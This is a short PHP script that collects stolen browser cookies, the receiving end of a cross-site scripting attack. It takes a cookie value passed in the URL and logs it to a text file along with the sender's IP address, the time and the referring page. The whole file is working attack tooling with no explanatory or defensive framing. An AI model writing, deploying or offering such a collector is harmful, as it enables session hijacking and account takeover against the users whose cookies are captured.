<?php
  $cookie = $_GET['cookie'];
  $ip = getenv ('REMOTE_ADDR');
  $date = date("H:i dS F");
  $referer=getenv ('HTTP_REFERER');
  $fp = fopen('cookielog.txt', 'a');
  fwrite($fp, "IP:      " . $ip . "\n");
  fwrite($fp, "Date:    " .$date. "\n");
  fwrite($fp, "Referer: " . $referer . "\n" );
  fwrite($fp, "Cookie:  " . $cookie . "\n---------------------------------------------------------------\n");
  fclose($fp);
?>
